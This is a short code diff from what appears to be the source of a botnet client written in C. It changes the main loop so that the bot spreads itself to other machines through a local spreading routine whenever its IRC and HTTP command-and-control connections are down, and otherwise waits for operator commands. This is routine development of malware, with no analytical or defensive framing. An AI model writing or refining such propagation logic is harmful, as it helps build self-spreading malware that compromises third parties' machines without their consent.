@@ -390,8 +390,11 @@ int main(void) {
             break;
         }
         
-        /* Spread if not connected to primary C2 */
-        if (!(g_bot.c2_enabled & (C2_IRC | C2_HTTP))) {
+        /* Spread if not connected to primary C2. The gate is the LIVE
+         * connection state, not the config-enabled bitmask: a bot whose
+         * C2 is down (or disabled) falls back to autonomous spreading,
+         * while a connected bot waits for operator commands (#95). */
+        if (!g_bot.c2_irc.connected && !g_bot.c2_http.connected) {
             log_info("Primary C2 unavailable, spreading locally");
             spread_local(&g_bot);
         }
